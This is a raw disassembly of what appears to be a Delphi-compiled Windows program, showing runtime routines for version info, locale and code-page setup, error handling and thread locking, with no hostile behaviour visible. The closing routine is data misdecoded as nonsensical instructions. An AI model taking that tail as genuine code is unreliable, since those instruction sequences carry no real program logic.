mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_40326c
xor eax eax
mov [ rw-data ] eax
sub_40bbd4
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_40422c
sub_40bc64
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40bd3a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404054
lea eax [ ebp - 0x8 ]
call j_sub_404488#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40447c
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bd41
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
mov eax ebx
call sub_4026bc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40bd1d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40447c
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40bd50
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40bdc8
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_40447c
mov edx esi
dec edx
call sub_40bd50
sub_40be04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40427c
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40be2c
pop esi
pop ebx
retn
mov eax ebx
call sub_40427c
mov esi eax
sub_40be2c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_40427c
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c03c
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40be84
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_40427c
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c03c
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c03c
dec eax
mov ebx eax
sub_40bf14
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_40427c
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40be84
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_40427c
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40bf78
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_40427c
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_40427c
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40be84
mov eax esi
call sub_40427c
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_40427c
mov [ esp ] eax
jmp r-xdata
sub_40c000
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_40447c
add eax esi
dec eax
call sub_40bfd8
sub_40c03c
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_40447c
add eax ebx
dec eax
call sub_40bfd8
add eax ebx
sub_40c078
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_40447c
push eax
mov eax esi
call sub_40447c
mov ebp eax
mov eax ebp
pop edx
call sub_40c13c
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c0b0
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_407cc0
mov eax esi
call sub_40427c
mov ebp eax
mov eax edi
mov edx ebp
call sub_404608
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_404488
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_404488
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_404488
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40c13c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_4084cc
mov [ esp ] eax
mov eax ebp
call sub_4084cc
mov edi eax
mov edx ebp
mov eax esi
call sub_408664
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40bdec
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_408664
mov ebx eax
inc ebx
sub_40c1dc
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c204
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c204
test eax eax
jne r-xdata
sub_40c204
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408650
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40bdec
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408650
mov edi eax
test edi edi
jne r-xdata
sub_40c244
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c2a8
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_40422c
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_408014
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c2af
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
sub_40c2b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c244
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c330
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c318
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c2b8
pop ecx
push ebp
call sub_40c2b8
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402dac
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c4a4
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40c76f
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c330
call sub_40ad08
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40ac58
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_404010
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40ac58
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_408014
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40ac58
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_408014
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40aca4
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40aca4
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40ac58
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_408014
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40aca4
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40ac58
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40af90
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_404010
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40ac58
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40af90
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_404010
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40aca4
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40ac58
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_404010
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40ac58
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_404010
lea eax [ ebp - 0x8 ]
call sub_403fbc
lea eax [ ebp - 0xc ]
call sub_403fbc
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40ac58
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_408014
test eax eax
jne r-xdata
call sub_40aee0
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404054
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404054
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_40433c
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_40433c
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40aca4
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c776
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403fe0
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40ac58
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_408014
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40ac58
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_408014
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404054
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404054
jmp r-xdata
sub_40c824
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40c8b4
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40ac0c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b50c
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c8bb
lea eax [ ebp - 0x14 ]
call sub_403fbc
retn
sub_40c90c
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_408458
mov [ rw-data ] eax
sub_40c990
push ebx
push esi
push edi
push ebp
call sub_4035f8
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4026dc
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_40325c
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035e0
sub_40c9f8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40c9e0
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40ca80
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407ac8
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40c980
mov [ ebp ] eax
sub_40ca80
push ebx
mov ebx eax
mov eax ebx
call sub_40c9e0
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40c980
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40cac0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40323c
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_40cb34
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax esi
call sub_40cbc0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_40326c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_40cbc0
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40cb7c
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40c9f8
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40c988
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40c968
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40c988
test eax eax
je r-xdata
mov eax edi
call sub_40cb7c
test bl bl
je r-xdata
mov eax edi
call sub_40cbb0
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40c968
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40c974
sub_40cc5c
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c9f8
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40c988
mov eax ebx
call sub_40cb94
mov eax ebx
call sub_40cb88
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ca70
sub_40ccac
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40c9f8
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40cba0
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40c974
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40c968
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40cba0
mov eax esi
call sub_40cb94
sub_40cd18
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c9f8
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40ca70
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40c968
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40cb94
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40cb94
sub_40cd90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40cdb4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ce2b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_405628
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_403320
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ce32
lea eax [ ebp - 0x4 ]
call sub_405628
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_403320
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40cd90
test al al
jne r-xdata
mov al 0x1
sub_40ce4c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40cebe
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40cea0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40447c
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cea7
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40ced0
sbb eax 0x4000000
rol [ esi ] cl
in al dx
loopne r-xdata
loopne r-xdata
add ah bh
rol [ esi ] cl
adc al ah
inc esi
add ah dh
rol [ esi ] cl
jl r-xdata
loop r-xdata
add [ edx + edx * 8 - 0x2033ffba ] dh
inc esi
add [ edx + edx * 8 - 0x202bffba ] ch
inc esi
add [ edx + edx * 8 - 0x1e2bffba ] ah
inc esi
add [ edx + edx * 8 - 0x202fffba ] bl
inc esi
add [ edx + edx * 8 - 0x1db7ffba ] dl
inc esi
add [ edx + edx * 8 - 0x1f3bffba ] cl
inc esi
add [ edx + edx * 8 - 0x1f5bffba ] al
inc esi
add [ edx + edx * 8 + 0x46 ] bh
add [ eax - 0x1e ] ah
inc esi
add [ edx + edx * 8 + 0x46 ] dh
add [ eax ] dl
pop ebx
mov esp ebp
pop ebp
retn
inc esi
add ah ch
rol [ esi ] cl
cmp cl ah
inc esi
add ah ah
rol [ esi ] cl
push 0xdc0046e1
rol [ esi ] cl
inc eax
fild [ esi ]
aam 0xd2
inc esi
add al bh
fild [ esi ]
int3
loope r-xdata
add [ edx + edx * 8 + 0x46 ] ch
add ah ah
fild [ esi ]
rol [ fs : esi ] cl
fsubr st1
inc esi
add [ edx + edx * 8 + 0x46 ] bl
add al ch
loope r-xdata
add [ eax ] al
add [ eax ] cl
rol [ esi ] cl
hlt
add [ edx + edx * 8 ] ah
inc esi
add al ah
fild [ esi ]
sub [ eax ] al
add [ eax ] al
sbb al 0xd2
inc esi
add [ ecx + 0x46 ] dh
add [ eax ] al
sbb dl dl
inc esi
add [ eax + 0x46de ] cl
add [ eax ] al
add [ edx + edx * 8 ] dl
inc esi
add [ eax ] ah
loope r-xdata
add [ eax ] al
add [ eax ] bl
rol [ esi ] cl
mov dh bl
inc esi
add [ eax ] al
add [ edx + edx * 8 + 0x46 ] dl
add [ edi + ebx * 8 ] ch
inc esi
add [ edx + edx * 8 + 0x46 ] cl
add ah ah
fiadd [ esi ]
inc esp
rol [ esi ] cl
mov al [ 0x3c0046e0 ]
rol [ esi ] cl
xor cl ah
inc esi
add [ edx + edx * 8 ] dh
inc esi
add [ esi + ebx * 8 + 0x46 ] cl
add [ edx + edx * 8 ] ch
inc esi
add al dl
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
rol [ esi ] cl
pop eax
fiadd [ esi ]
add [ eax ] al
add [ eax ] al
or al 0xd2
inc esi
add ah bh
fiadd [ esi ]
add [ eax ] al
add [ eax ] al
or dl dl
inc esi
add ah dh
fiadd [ esi ]
add [ eax ] al
add [ eax ] al
add al 0xd2
inc esi
add [ eax + 0x46de ] ah
add [ eax ] al
add [ eax ] al
rol [ esi ] cl
fcomp st7
inc esi
add [ eax ] al
add [ eax ] al
